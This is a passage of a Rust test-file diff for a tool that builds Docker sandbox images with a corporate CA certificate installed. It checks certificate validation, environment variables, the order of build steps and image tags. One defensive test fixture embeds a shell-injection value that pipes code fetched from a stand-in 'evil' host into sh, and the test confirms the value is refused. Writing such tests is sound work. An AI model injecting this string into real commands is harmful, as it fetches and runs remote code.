+            "and a command — not a comment — rebuilds the system store from it"
+        );
+
+        // **One of these is load-bearing and six are belt and braces**, and
+        // the difference is measured rather than assumed. Three arms against
+        // an `openssl s_server` presenting a leaf signed by a private root:
+        // with no root installed, every toolchain refuses. With the root in
+        // the system store and *none* of these variables set, curl, python,
+        // git, go, pip and cargo all verify — Debian's pip included, whose
+        // vendored certifi resolves to the system bundle. Only node still
+        // fails, with `UNABLE_TO_VERIFY_LEAF_SIGNATURE`. With the variables
+        // set, node verifies too.
+        //
+        // So `NODE_EXTRA_CA_CERTS` is the one whose absence breaks a build on
+        // today's base image. The rest are kept because they cost nothing and
+        // cover a base image that patches its tools differently — but this
+        // test must not claim they are each what makes their tool work, which
+        // is what it used to say.
+        //
+        // **Values, not just names.** Asserting the name alone let two
+        // mutations through: renaming the written file to `omh-ca.pem` (which
+        // `update-ca-certificates` then skips, because it globs `*.crt`), and
+        // pointing the bundle at `/etc/ssl/cert.pem`, which does not exist on
+        // Debian. Both left the suite green while the sandbox trusted nothing.
+        const BUNDLE: &str = "/etc/ssl/certs/ca-certificates.crt";
+        const NODE_AT: &str = "/usr/local/share/omh-ca.pem";
+
+        // One logical Dockerfile instruction: the line that opens it plus the
+        // `\`-continuations under it.
+        let instruction = |opens: &str| -> String {
+            let mut out = String::new();
+            let mut lines = commands
+                .lines()
+                .skip_while(|l| !l.trim_start().starts_with(opens));
+            for line in lines.by_ref() {
+                let continues = line.trim_end().ends_with('\\');
+                out.push_str(line);
+                out.push('\n');
+                if !continues {
+                    break;
+                }
+            }
+            out
+        };
+        let env_block = instruction("ENV SSL_CERT_FILE");
+        assert!(
+            !env_block.is_empty(),
+            "no `ENV` instruction sets the certificate variables: {commands}"
+        );
+
+        // The `/etc/environment` block is a `RUN`, and it is not the only
+        // `RUN printf` in the recipe — the session entrypoint is another. Find
+        // it by the redirect that makes it this one.
+        let etc_environment = {
+            let all: Vec<&str> = commands.lines().collect();
+            let end = all
+                .iter()
+                .position(|l| l.contains(">> /etc/environment"))
+                .unwrap_or_else(|| panic!("nothing writes /etc/environment: {commands}"));
+            let start = all[..=end]
+                .iter()
+                .rposition(|l| l.trim_start().starts_with("RUN "))
+                .expect("the redirect is inside a RUN");
+            all[start..=end].join("\n")
+        };
+        for (var, value, why) in [
+            (
+                "NODE_EXTRA_CA_CERTS",
+                NODE_AT,
+                "node, measured to ignore the system store — without this the \
+                 build fails where it failed before",
+            ),
+            (
+                "SSL_CERT_FILE",
+                BUNDLE,
+                "openssl's default, which already points here — belt and braces",
+            ),
+            (
+                "SSL_CERT_DIR",
+                "/etc/ssl/certs",
+                "openssl's by-hash lookups — belt and braces",
+            ),
+            (
+                "REQUESTS_CA_BUNDLE",
+                BUNDLE,
+                "a requests that does not read the store — belt and braces",
+            ),
+            (
+                "PIP_CERT",
+                BUNDLE,
+                "a pip vendoring its own certifi rather than Debian's — belt \
+                 and braces",
+            ),
+            (
+                "CARGO_HTTP_CAINFO",
+                BUNDLE,
+                "cargo, measured to read the store here — belt and braces",
+            ),
+            (
+                "GIT_SSL_CAINFO",
+                BUNDLE,
+                "git, measured to read the store here — belt and braces",
+            ),
+        ] {
+            // **Each instruction on its own, never the recipe as a whole.**
+            // The `ENV` line and the `/etc/environment` block write the same
+            // seven `VAR=VALUE` substrings, so a `commands.contains(..)` was
+            // satisfied by either one — and the two blocks became each other's
+            // alibi. Deleting the whole `ENV` instruction left all 1330 tests
+            // green, which ships the original bug: `/etc/environment` is read
+            // by `pam_env` at ssh login and by nothing else, so `docker build`
+            // and `docker exec` would both lose `NODE_EXTRA_CA_CERTS` — the
+            // one variable measured to be load-bearing.
+            assert!(
+                env_block.contains(&format!("{var}={value}")),
+                "{var} is missing from the `ENV` instruction, so `docker \
+                 build` and `docker exec` do not have it: {why}\n{env_block}"
+            );
+            assert!(
+                etc_environment.contains(&format!("{var}={value}")),
+                "{var} is missing from the `/etc/environment` block, so an \
+                 ssh login from an editor does not have it: {why}\n\
+                 {etc_environment}"
+            );
+            assert!(
+                !without.contains(var),
+                "{var} must not be set when there is no certificate"
+            );
+        }
+        assert!(
+            !without.contains("update-ca-certificates"),
+            "and none of it appears when no certificate is set"
+        );
+
+        // The file the store is built from has to be one
+        // `update-ca-certificates` will look at: it globs `*.crt` under that
+        // directory and ignores everything else, silently.
+        assert!(
+            commands.contains("> /usr/local/share/ca-certificates/omh-ca-1.crt"),
+            "the certificate must be written where update-ca-certificates \
+             scans, under a name it will not skip: {commands}"
+        );
+
+        // **`ENV` does not reach an ssh login.** `omh s run` and `attach` go
+        // through `docker exec`, which inherits the image environment, so they
+        // were fine. Editor attach does not: `src/ssh.rs` hands VS Code, Zed
+        // and JetBrains an `ssh://` target, and sshd builds a session
+        // environment from PAM rather than passing its own — so node, pip and
+        // cargo, the three that need telling separately from the system store,
+        // lose their variables in an editor terminal while `curl` and `git`
+        // keep working. The build succeeds, the session half-works, and the
+        // docs promise both.
+        //
+        // `/etc/environment` is what `pam_env` reads, and sshd runs it.
+        // The seven-variable loop above asserts this block by name *and*
+        // value, so there is no separate list here any more. There used to be
+        // one, over four of the seven, and it read
+        // `commands.contains("{var}=") && commands.contains("/etc/environment")`
+        // — a left half the `ENV` line satisfied and a right half independent
+        // of `var`, so deleting six of the seven lines was green.
+
+        // **Order, not just presence.** The first version put the certificate
+        // at the top, before `apt-get install ca-certificates` — so
+        // `update-ca-certificates` did not exist yet and every build died. It
+        // has to land after the package that provides it and before the first
+        // fetch that needs it, which is the graph download.
+        //
+        // Measured on `commands`, for the reason above: the same two
+        // assertions against the raw recipe constrained where a comment sat.
+        let at = |needle: &str| {
+            commands
+                .find(needle)
+                .unwrap_or_else(|| panic!("{needle} is not a command in the recipe"))
+        };
+        assert!(
+            at("install -y --no-install-recommends") < at("&& update-ca-certificates"),
+            "the certificate must land after `ca-certificates` is installed, \
+             or the command that reads it is not there yet"
+        );
+        // The graph install is the first thing in the recipe that fetches
+        // over TLS, and it is substituted in, so the marker is what it
+        // downloads rather than the placeholder.
+        assert!(
+            at("&& update-ca-certificates") < at("codebase-memory-mcp-ui-linux"),
+            "and before the first fetch that needs it"
+        );
+
+        // **All three tags move, and the docstring's claim is now asserted.**
+        // Only the base carries the certificate; the harness and stack layers
+        // are `FROM` it and hash the base recipe, so one change moves all
+        // three. Nothing checked that, and a tag that did not move is the
+        // stale-tag failure `tag_for` records.
+        let a = claude();
+        assert_ne!(base_tag(Some(pem)), base_tag(None), "the base tag moves");
+        assert_ne!(
+            tag_for(&a, Some(pem)),
+            tag_for(&a, None),
+            "and the harness tag with it"
+        );
+        assert_ne!(
+            stack_tag(&a, &["corepack enable pnpm"], Some(pem)),
+            stack_tag(&a, &["corepack enable pnpm"], None),
+            "and the stack tag, or a session runs an image built without it"
+        );
+        assert_ne!(
+            recipe_digest(&with).unwrap(),
+            recipe_digest(&without).unwrap(),
+            "a different trust store is a different image"
+        );
+    }
+
+    /// Two different certificates are two different images.
+    ///
+    /// The half that a `--build-arg` would have got wrong: it is not enough
+    /// that *having* a certificate moves the tag, because somebody whose
+    /// company rotates its root would otherwise keep building against the old
+    /// one and be told it was already built.
+    #[test]
+    fn changing_the_certificate_changes_the_tag() {
+        let a = base_dockerfile(Some(
+            "-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----",
+        ));
+        let b = base_dockerfile(Some(
+            "-----BEGIN CERTIFICATE-----\nBBBB\n-----END CERTIFICATE-----",
+        ));
+        assert_ne!(recipe_digest(&a).unwrap(), recipe_digest(&b).unwrap());
+
+        // The recipe digest is not where the bug lived. `tag_for` and
+        // `stack_tag` are what a session resolves, and this test's name and
+        // docstring are about tags — so assert on tags, not on the input they
+        // happen to share today.
+        let one = "-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----";
+        let two = "-----BEGIN CERTIFICATE-----\nBBBB\n-----END CERTIFICATE-----";
+        let h = claude();
+        assert_ne!(base_tag(Some(one)), base_tag(Some(two)));
+        assert_ne!(tag_for(&h, Some(one)), tag_for(&h, Some(two)));
+        assert_ne!(
+            stack_tag(&h, &["corepack enable pnpm"], Some(one)),
+            stack_tag(&h, &["corepack enable pnpm"], Some(two)),
+            "a rotated root must rebuild the stack layer too, or the session \
+             keeps running the image built against the retired one"
+        );
+    }
+
     #[test]
     fn tags_name_their_harness() {
-        assert!(tag_for(&claude()).starts_with("omh/claude:"));
+        assert!(tag_for(&claude(), None).starts_with("omh/claude:"));
     }
 
     /// Regression: with a fixed `:latest`, `ensure` saw the tag present and
@@ -1618,7 +2431,7 @@ mod tests {
     /// rebuilding it and a base change — adding `socat` — silently never shipped.
     #[test]
     fn a_changed_base_recipe_is_a_different_base_tag() {
-        let before = base_tag();
+        let before = base_tag(None);
         assert!(before.starts_with("omh/base:"));
         assert_ne!(before, "omh/base:latest", "a mutable tag never rebuilds");
     }
@@ -1627,8 +2440,8 @@ mod tests {
     /// base leaves the harness image referencing something that no longer exists.
     #[test]
     fn the_harness_layer_pins_an_exact_base() {
-        let df = harness_dockerfile(&claude());
-        assert!(df.contains(&base_tag()), "got: {df}");
+        let df = harness_dockerfile(&claude(), None);
+        assert!(df.contains(&base_tag(None)), "got: {df}");
         assert!(!df.contains("omh/base:latest"), "got: {df}");
     }
 
@@ -1640,8 +2453,8 @@ mod tests {
     /// install that already built the old one.
     #[test]
     fn the_stack_layer_pins_the_exact_harness_layer() {
-        let df = stack_dockerfile(&claude(), &["apt-get install -y gcc"]);
-        assert!(df.contains(&tag_for(&claude())), "got: {df}");
+        let df = stack_dockerfile(&claude(), &["apt-get install -y gcc"], None);
+        assert!(df.contains(&tag_for(&claude(), None)), "got: {df}");
         assert!(!df.contains(":latest"), "got: {df}");
     }
 
@@ -1652,15 +2465,15 @@ mod tests {
     #[test]
     fn a_different_set_of_fired_installs_is_a_different_tag() {
         let a = claude();
-        let pnpm = stack_tag(&a, &["corepack enable pnpm"]);
-        let yarn = stack_tag(&a, &["corepack enable yarn"]);
-        let both = stack_tag(&a, &["corepack enable pnpm", "corepack enable yarn"]);
+        let pnpm = stack_tag(&a, &["corepack enable pnpm"], None);
+        let yarn = stack_tag(&a, &["corepack enable yarn"], None);
+        let both = stack_tag(&a, &["corepack enable pnpm", "corepack enable yarn"], None);
 
         assert_ne!(pnpm, yarn, "different provides, different image");
         assert_ne!(pnpm, both, "a superset is a different image too");
         assert_eq!(
             pnpm,
-            stack_tag(&a, &["corepack enable pnpm"]),
+            stack_tag(&a, &["corepack enable pnpm"], None),
             "and an unchanged resolution must not rebuild"
         );
         // Order is part of the recipe, not a presentation detail. `corepack
@@ -1670,8 +2483,712 @@ mod tests {
         // order, which is a cache hit on a build that never happened.
         assert_ne!(
             both,
-            stack_tag(&a, &["corepack enable yarn", "corepack enable pnpm"]),
+            stack_tag(&a, &["corepack enable yarn", "corepack enable pnpm"], None),
             "a reordered recipe is a different image"
+        );
+    }
+
+    /// A repo whose settings say what this fixture wants them to say.
+    fn ca_fixture(setting: Option<&str>) -> (tempfile::TempDir, crate::profile::Paths) {
+        let dir = tempfile::tempdir().unwrap();
+        let paths = crate::profile::Paths {
+            root: dir.path().join("home"),
+            repo: dir.path().join("repo"),
+        };
+        std::fs::create_dir_all(paths.repo.join(".omh")).unwrap();
+        if let Some(at) = setting {
+            std::fs::write(
+                paths.repo.join(".omh/settings.toml"),
+                format!("ca_cert = \"{at}\"\n"),
+            )
+            .unwrap();
+        }
+        (dir, paths)
+    }
+
+    const PEM: &str = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n";
+
+    /// **`ca_for` had no test at all**, and it is the function this whole
+    /// feature turns on. Two mutations found by review both survived the full
+    /// suite: replacing the `BEGIN CERTIFICATE` check with `true`, and turning
+    /// the read error into `Ok(None)`. The second inverts the promise the
+    /// function's own doc makes in bold — and produces exactly what that doc
+    /// warns of, a rebuild of the image that was already failing, reported as
+    /// success.
+    ///
+    /// Table-driven because the interesting property is that these answers are
+    /// *distinguishable*. A set-but-unreadable certificate resolving to the
+    /// same `None` as a certificate nobody set is the whole bug.
+    #[test]
+    fn ca_for_tells_absent_from_unreadable() {
+        let (_d, paths) = ca_fixture(None);
+        assert_eq!(
+            ca_for(&paths).unwrap(),
+            None,
+            "a certificate nobody set is the one honest `None`"
+        );
+
+        let (dir, paths) = ca_fixture(Some("/nowhere/corp.pem"));
+        let e = format!("{:#}", ca_for(&paths).unwrap_err());
+        assert!(e.contains("/nowhere/corp.pem"), "must name the path: {e}");
+        assert!(e.contains("ca_cert"), "and the setting: {e}");
+
+        // A directory. `read_to_string` refuses it, and the refusal must not
+        // be the DER advice below — converting a directory is not the fix.
+        let at = dir.path().join("adir");
+        std::fs::create_dir_all(&at).unwrap();
+        let (_d2, paths) = ca_fixture(Some(&at.display().to_string()));
+        assert!(ca_for(&paths).is_err(), "a directory is not a certificate");
+
+        // Not a PEM. This is the one case where `openssl x509 -inform der` is
+        // the right advice, so it is the one case that may give it.
+        let at = dir.path().join("corp.der");
+        std::fs::write(&at, [0x30u8, 0x82, 0x01, 0x0a]).unwrap();
+        let (_d3, paths) = ca_fixture(Some(&at.display().to_string()));
+        let e = format!("{:#}", ca_for(&paths).unwrap_err());
+        assert!(e.contains("-inform der"), "must give the conversion: {e}");
+
+        // Empty. Also not a PEM, and the DER advice would send the reader to
+        // convert a file with nothing in it.
+        let at = dir.path().join("empty.pem");
+        std::fs::write(&at, "").unwrap();
+        let (_d4, paths) = ca_fixture(Some(&at.display().to_string()));
+        let e = format!("{:#}", ca_for(&paths).unwrap_err());
+        assert!(e.contains("empty"), "an empty file is named as empty: {e}");
+        assert!(
+            !e.contains("-inform der"),
+            "and is not sent to convert nothing: {e}"
+        );
+
+        // The one that works, byte for byte — the recipe embeds this text, so
+        // anything lost here is lost in the image.
+        let at = dir.path().join("corp.pem");
+        std::fs::write(&at, PEM).unwrap();
+        let (_d5, paths) = ca_fixture(Some(&at.display().to_string()));
+        assert_eq!(ca_for(&paths).unwrap().as_ref().map(Root::pem), Some(PEM));
+    }
+
+    /// **A settings file omh cannot read is not a settings file with nothing
+    /// in it.** `policy_value` answers `Option`, so `config::policy`'s two
+    /// deliberate errors — a file that exists and cannot be read, and one that
+    /// does not parse — both arrived here as "no certificate set", and the
+    /// build then reported success on an image with no certificate in it.
+    ///
+    /// `config::read_layer` carries a comment about the closed loop that shape
+    /// produces. This is the same loop, one layer up.
+    #[test]
+    fn a_settings_file_omh_cannot_parse_is_not_a_repo_without_a_certificate() {
+        let (_d, paths) = ca_fixture(None);
+        std::fs::write(
+            paths.repo.join(".omh/settings.toml"),
+            "ca_cert = \"unclosed\n",
+        )
+        .unwrap();
+        let e = format!("{:#}", ca_for(&paths).unwrap_err());
+        assert!(
+            e.contains("settings") || e.contains("parsing"),
+            "the refusal must name the file it could not read: {e}"
+        );
+    }
+
+    /// **The comment said refuse; the code mangled.** `ca_layer` wrote each
+    /// PEM line as a single-quoted `printf` argument and ran
+    /// `.replace(['\'', '\\'], "")` over it first — silently deleting
+    /// characters from a file the user named, while the comment above it said
+    /// a certificate needing escaping is one to refuse rather than mangle.
+    ///
+    /// It is not hypothetical content: an `openssl pkcs12` export carries
+    /// `Bag Attributes` and `friendlyName:` preamble lines, and company names
+    /// carry apostrophes. Because the tag is a digest of the recipe, a mangled
+    /// certificate names an image after a certificate that is not the one on
+    /// disk.
+    ///
+    /// The check lives in `ca_for`, which already answers `Result` — that is
+    /// what makes `ca_layer` correct by construction rather than careful.
+    #[test]
+    fn a_certificate_that_would_need_escaping_is_refused_not_rewritten() {
+        let (dir, _) = ca_fixture(None);
+        let at = dir.path().join("corp.pem");
+        std::fs::write(
+            &at,
+            "friendlyName: O'Brien Corp Root\n-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n",
+        )
+        .unwrap();
+        let (_d, paths) = ca_fixture(Some(&at.display().to_string()));
+        let e = format!("{:#}", ca_for(&paths).unwrap_err());
+        assert!(
+            e.contains("1") || e.to_lowercase().contains("line"),
+            "the refusal must point at the line: {e}"
+        );
+
+        // And the shell-injection shape, which is the same defect read the
+        // other way round. Refused, not neutralised by deletion.
+        let at = dir.path().join("evil.pem");
+        std::fs::write(
+            &at,
+            "-----BEGIN CERTIFICATE-----\n' && curl http://evil/ | sh && printf '\n-----END CERTIFICATE-----\n",
+        )
+        .unwrap();
+        let (_d2, paths) = ca_fixture(Some(&at.display().to_string()));
+        assert!(ca_for(&paths).is_err(), "a quote in a PEM body is refused");
+    }
+
+    /// **"Refuses" has to mean refuses.** Both doc pages promised that a
+    /// `pkcs12` export carrying `Bag Attributes` / `friendlyName:` preamble is
+    /// refused rather than rewritten. The code refused only a quote or a
+    /// backslash, so a clean `friendlyName: Zscaler Root CA` was *accepted*
+    /// and `ca_layer` then silently dropped it — a rewrite, which is the one
+    /// thing the setting's whole design says omh will not do. The test that
+    /// looked like it covered this passed on the apostrophe in `O'Brien`, not
+    /// on the preamble.
+    ///
+    /// Three shapes, each a real way to hand omh a file that is not one
+    /// certificate:
+    ///
+    /// - preamble outside the block, which `openssl pkcs12` emits;
+    /// - a truncated block, which a clipped copy-paste of
+    ///   `security find-certificate -a` produces — `BEGIN` with no `END` was
+    ///   accepted, and `ca_layer` dropped the unterminated block, writing an
+    ///   image with *no* certificate in it and a green build;
+    /// - a CSR, whose `-----BEGIN CERTIFICATE REQUEST-----` contains the
+    ///   substring `BEGIN CERTIFICATE` and so passed the old check.
+    #[test]
+    fn a_file_that_is_not_exactly_certificates_is_refused() {
+        let (dir, _) = ca_fixture(None);
+        let refuse = |name: &str, body: &str| -> String {
+            let at = dir.path().join(name);
+            std::fs::write(&at, body).unwrap();
+            let (_d, paths) = ca_fixture(Some(&at.display().to_string()));
+            let e = ca_for(&paths)
+                .map(|got| {
+                    panic!("{name} must be refused, got {got:?}");
+                })
+                .unwrap_err();
+            format!("{e:#}")
+        };
+
+        // Preamble, with not a quote or backslash anywhere in it.
+        let e = refuse(
+            "p12.pem",
+            "Bag Attributes\n    friendlyName: Zscaler Root CA\n    localKeyID: 01 00 00 00\nsubject=C=US, O=Zscaler Inc., CN=Zscaler Root CA\n-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n",
+        );
+        assert!(
+            e.contains("friendlyName") || e.to_lowercase().contains("outside"),
+            "the refusal must point at the preamble it will not drop: {e}"
+        );
+
+        // Truncated: a block that opens and never closes.
+        let e = refuse("clipped.pem", "-----BEGIN CERTIFICATE-----\nQUJD\nWFla\n");
+        assert!(
+            e.to_lowercase().contains("end certificate") || e.to_lowercase().contains("truncated"),
+            "a clipped paste must be named as unterminated: {e}"
+        );
+
+        // A CSR. `BEGIN CERTIFICATE REQUEST` contains `BEGIN CERTIFICATE`.
+        let e = refuse(
+            "req.pem",
+            "-----BEGIN CERTIFICATE REQUEST-----\nQUJD\n-----END CERTIFICATE REQUEST-----\n",
+        );
+        assert!(
+            !e.is_empty(),
+            "a certificate request is not a certificate: {e}"
+        );
+
+        // And the shape that must still be accepted, unchanged: blank lines
+        // around the blocks are ordinary in a PEM and are not preamble.
+        let at = dir.path().join("spaced.pem");
+        std::fs::write(
+            &at,
+            "\n-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n\n-----BEGIN CERTIFICATE-----\nWFla\n-----END CERTIFICATE-----\n\n",
+        )
+        .unwrap();
+        let (_d, paths) = ca_fixture(Some(&at.display().to_string()));
+        assert!(
+            ca_for(&paths).unwrap().is_some(),
+            "blank lines between blocks are not preamble"
+        );
+    }
+
+    /// **The path that gets mounted is the path that was validated.**
+    ///
+    /// There used to be a `ca_path` beside `ca_for`: it called `ca_for` for the
+    /// refusals and then read the settings a *second* time for the value, so
+    /// nothing tied the two together — `docker run -v` got a path that had not
+    /// been checked, from a reading `ca_for` never saw. `Root` carries both, so
+    /// the pair cannot disagree and there is no second function to keep in
+    /// step.
+    ///
+    /// It also refuses a relative path, which the old `ca_for` could not: a
+    /// relative `ca_cert` *resolves* against the process CWD, so the PEM reads
+    /// fine and the image is correct, while docker reads a non-absolute `-v`
+    /// source as a **named volume** and mounts an empty directory where the
+    /// certificate should be. `key::quarrel` warns at `omh set` time, but this
+    /// key is `Secret::No` — it lands in the committed layer and arrives with a
+    /// clone, and a hand-edited `settings.toml` never passes through `set` at
+    /// all. The warning is advice; this is the refusal.
+    #[test]
+    fn a_root_carries_the_path_its_certificate_came_from() {
+        let (dir, _) = ca_fixture(None);
+        let at = dir.path().join("corp.pem");
+        std::fs::write(&at, PEM).unwrap();
+
+        let (_d, paths) = ca_fixture(Some(&at.display().to_string()));
+        let root = ca_for(&paths).unwrap().expect("a certificate is set");
+        assert_eq!(root.pem(), PEM, "the text the recipe embeds");
+        assert_eq!(
+            root.path(),
+            at.as_path(),
+            "and the file the cross-build mounts — one reading, so they agree"
+        );
+
+        // Relative: readable from this directory, which is what made it silent.
+        let cwd = std::env::current_dir().unwrap();
+        std::env::set_current_dir(dir.path()).unwrap();
+        let (_d2, paths) = ca_fixture(Some("corp.pem"));
+        let got = ca_for(&paths);
+        std::env::set_current_dir(cwd).unwrap();
+
+        let e = format!("{:#}", got.unwrap_err());
+        assert!(
+            e.contains("absolute"),
+            "the refusal must say what is wrong with it: {e}"
+        );
+        assert!(
+            e.contains("named volume") || e.contains("empty directory"),
+            "and what docker would otherwise do: {e}"
+        );
+    }
+
+    /// **A bundle is what corporate IT hands out, and it half-worked.**
+    ///
+    /// Measured against a real build: `update-ca-certificates` treats each
+    /// file under `/usr/local/share/ca-certificates` as exactly one
+    /// certificate. Given two in one file it prints
+    /// `rehash: warning: skipping omh-ca.pem, it does not contain exactly one
+    /// certificate or CRL` and `1 added` — both roots reach
+    /// `ca-certificates.crt`, so the five variables pointing at the bundle
+    /// work, but no `<hash>.0` symlink is made and `SSL_CERT_DIR`, which this
+    /// recipe also sets, cannot find the root by hash.
+    ///
+    /// So the invariant is one file per certificate, and the count is the
+    /// assertion: a chain of three must not become one file with three blocks.
+    #[test]
+    fn every_certificate_in_a_bundle_gets_its_own_file() {
+        let one = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n";
+        let two = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n\
+                   -----BEGIN CERTIFICATE-----\nWFla\n-----END CERTIFICATE-----\n";
+
+        let single = base_dockerfile(Some(one));
+        let bundle = base_dockerfile(Some(two));
+
+        let written = |recipe: &str| -> usize {
+            recipe
+                .lines()
+                .filter(|l| !l.trim_start().starts_with('#'))
+                // A *write into* the scanned directory. `cat ... > <bundle>`
+                // names that directory too and is not one of these.
+                .filter(|l| l.contains("> /usr/local/share/ca-certificates/omh-ca-"))
+                .count()
+        };
+        assert_eq!(written(&single), 1, "one certificate, one file");
+        assert_eq!(
+            written(&bundle),
+            2,
+            "two certificates must be two files, or `update-ca-certificates` \
+             hashes neither and `SSL_CERT_DIR` cannot find the root"
+        );
+        assert_ne!(
+            recipe_digest(&single).unwrap(),
+            recipe_digest(&bundle).unwrap(),
+            "and a chain is not the same trust store as its root alone"
+        );
+    }
+
+    /// **Node reads that one file and nothing else, so it must hold the whole
+    /// chain.** The split above exists for `update-ca-certificates`, which
+    /// wants one certificate per file; node wants the opposite, and gets it by
+    /// concatenation. Nothing asserted the concatenation was a glob, so
+    /// narrowing it to `omh-ca-1.crt` was green — and an intermediate-signed
+    /// leaf then fails in node alone, on the machines this setting exists for,
+    /// while curl and git keep working off the system store.
+    ///
+    /// Measured, three arms against an `openssl s_server` presenting a leaf
+    /// signed by a private root: with no root installed every toolchain
+    /// refuses; with the root in the system store and no variables set, curl,
+    /// python, git, go, pip and cargo all verify and **node alone still fails**
+    /// with `UNABLE_TO_VERIFY_LEAF_SIGNATURE`; with the variables set node
+    /// verifies too. That is what makes this file, and not the store, node's
+    /// only source of the root.
+    #[test]
+    fn the_file_node_reads_carries_the_whole_chain() {
+        let two = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n\
+                   -----BEGIN CERTIFICATE-----\nWFla\n-----END CERTIFICATE-----\n";
+        let recipe = base_dockerfile(Some(two));
+
+        // The variable names a path; that path must be built from every file
+        // the split wrote, not from one of them.
+        let node_at = "/usr/local/share/omh-ca.pem";
+        assert!(
+            recipe.contains(&format!("NODE_EXTRA_CA_CERTS={node_at}")),
+            "node's variable must name the concatenated file: {recipe}"
+        );
+        let cat = recipe
+            .lines()
+            .find(|l| l.contains(&format!("> {node_at}")))
+            .unwrap_or_else(|| panic!("nothing builds {node_at}: {recipe}"));
+        assert!(
+            cat.contains("omh-ca-*.crt"),
+            "the file node reads is built from `{cat}`, which names one \
+             certificate rather than the chain — a root behind an intermediate \
+             then fails in node alone"
+        );
+
+        // And it is built after the files it concatenates, not before.
+        let wrote_last = recipe
+            .lines()
+            .position(|l| l.contains("> /usr/local/share/ca-certificates/omh-ca-2.crt"))
+            .expect("the second certificate is written");
+        let concatenated = recipe
+            .lines()
+            .position(|l| l.contains(&format!("> {node_at}")))
+            .expect("the chain is concatenated");
+        assert!(
+            wrote_last < concatenated,
+            "the chain is assembled before its last certificate is written"
+        );
+    }
+
+    /// **One resolution of `ca_cert` per command, and one way to hold it.**
+    ///
+    /// A second read can differ from the first, and then omh builds one image
+    /// and names another — the split `0af80b9` closed in `session_up`, and
+    /// which a review found still open in `doctor` and `init`.
+    ///
+    /// Two rules, and `Root` is what makes the second one cheap to check:
+    ///
+    /// 1. No function resolves twice.
+    /// 2. `cmd::init::sandbox` does not resolve **at all** — it is handed the
+    ///    caller's reading. Every command funnels through it, so while it
+    ///    resolved independently, any caller that also needed the certificate
+    ///    for a harness image resolved twice by construction.
+    ///
+    /// The scan no longer exempts `image.rs`. It used to, and that was a hole:
+    /// `ca_path` lived there and called `ca_for`, so `omh s run` and
+    /// `omh s attach` each resolved twice through `deliver`, invisibly. `Root`
+    /// deleted `ca_path` — the path and the pem come off one reading now — so
+    /// the exemption is gone with it and the scan can see the whole tree.
+    #[test]
+    fn no_command_resolves_the_certificate_twice() {
+        let mut stack = vec![std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src")];
+        let mut resolvers: Vec<String> = Vec::new();
+        let mut twice: Vec<String> = Vec::new();
+        let mut sandbox_resolves = false;
+        let mut saw_sandbox_fn = false;
+        while let Some(at) = stack.pop() {
+            for entry in std::fs::read_dir(&at).unwrap().flatten() {
+                let path = entry.path();
+                if path.is_dir() {
+                    stack.push(path);
+                    continue;
+                }
+                if path.extension().is_none_or(|e| e != "rs") {
+                    continue;
+                }
+                let whole = std::fs::read_to_string(&path).unwrap();
+                // Production code only. A test may resolve as often as it likes.
+                let body = whole.split("#[cfg(test)]").next().unwrap_or("");
+                let name = path
+                    .strip_prefix(env!("CARGO_MANIFEST_DIR"))
+                    .unwrap_or(&path)
+                    .display()
+                    .to_string();
+                let lines: Vec<&str> = body.lines().collect();
+                let opens = |l: &str| {
+                    let l = l.trim_end();
+                    l.starts_with("fn ")
+                        || l.starts_with("pub fn ")
+                        || l.starts_with("pub(crate) fn ")
+                        || l.starts_with("async fn ")
+                        || l.starts_with("pub async fn ")
+                        || l.starts_with("pub(crate) async fn ")
+                };
+                let heads: Vec<usize> = (0..lines.len()).filter(|&n| opens(lines[n])).collect();
+                for (k, &head) in heads.iter().enumerate() {
+                    let end = heads.get(k + 1).copied().unwrap_or(lines.len());
+                    let block = lines[head..end].join("\n");
+                    // `ca_for` is the resolver; `Root::read` is its constructor
+                    // and is private, so counting the resolver is enough.
+                    let n = block.matches("ca_for(").count();
+                    let sig = lines[head].trim_end();
+                    if sig.contains(" sandbox(") {
+                        saw_sandbox_fn = true;
+                        if n > 0 {
+                            sandbox_resolves = true;
+                        }
+                    }
+                    if n > 0 {
+                        resolvers.push(format!("{name}: {sig}"));
+                    }
+                    if n > 1 {
+                        twice.push(format!("{name}: {sig} ({n})"));
+                    }
+                }
+            }
+        }
+
+        assert!(
+            twice.is_empty(),
+            "these resolve `ca_cert` more than once, so the tag they name and \
+             the layer they build can describe different images: {twice:#?}"
+        );
+        assert!(saw_sandbox_fn, "the scan never found `fn sandbox` at all");
+        assert!(
+            !sandbox_resolves,
+            "`cmd::init::sandbox` resolves `ca_cert` itself. Every command \
+             funnels through it, so a caller that also needs the certificate \
+             for its harness image resolves twice — take the caller's reading \
+             as a parameter instead"
+        );
+
+        // **Liveness by name.** A scan keyed on a spelling goes quiet the
+        // moment the spelling changes, and an empty result would read as a
+        // pass. These are the entry points that legitimately resolve once.
+        for must in [
+            "src/cmd/init.rs",
+            "src/cmd/inspect.rs",
+            "src/memory/deliver.rs",
+        ] {
+            assert!(
+                resolvers.iter().any(|f| f.starts_with(must)),
+                "{must} no longer resolves `ca_cert` under a spelling this \
+                 scan can see — it reads less than it did: {resolvers:#?}"
+            );
+        }
+    }
+
+    /// **`Root::read` is the only way to hold one.** That is the whole of what
+    /// the type buys: three comments in this file used to claim a value had
+    /// "already been refused upstream", and none of them could be true of a
+    /// function taking `&str`. A second constructor — or a `pub` field, or a
+    /// `Root { .. }` literal anywhere else — would quietly restore that.
+    #[test]
+    fn nothing_builds_a_root_except_its_one_constructor() {
+        let src = std::fs::read_to_string(file!()).unwrap();
+        let body = src.split("#[cfg(test)]").next().unwrap_or("");
+        // `Root {` also opens the `struct` and its `impl`; neither builds one.
+        let literals = body.matches("Root {").count()
+            - body.matches("struct Root {").count()
+            - body.matches("impl Root {").count();
+        assert_eq!(
+            literals, 0,
+            "a `Root {{ .. }}` literal outside `read` is a way to build one \
+             that skipped the refusals"
+        );
+        assert_eq!(
+            body.matches("Self { path: at, pem }").count(),
+            1,
+            "and one construction, inside `read`"
+        );
+        assert!(
